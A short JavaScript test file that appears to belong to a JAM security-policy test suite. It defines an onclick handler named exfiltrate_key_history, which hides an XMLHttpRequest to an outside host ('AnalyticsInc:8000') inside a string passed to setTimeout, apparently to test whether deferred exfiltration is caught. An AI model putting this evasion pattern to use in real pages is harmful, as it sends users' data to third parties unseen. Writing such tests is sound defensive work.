// exfil_test_timeout.js
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=timeout", true);xmlhttp.send(null);';
  JAM.call(setTimeout, null, [exp, 10]);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

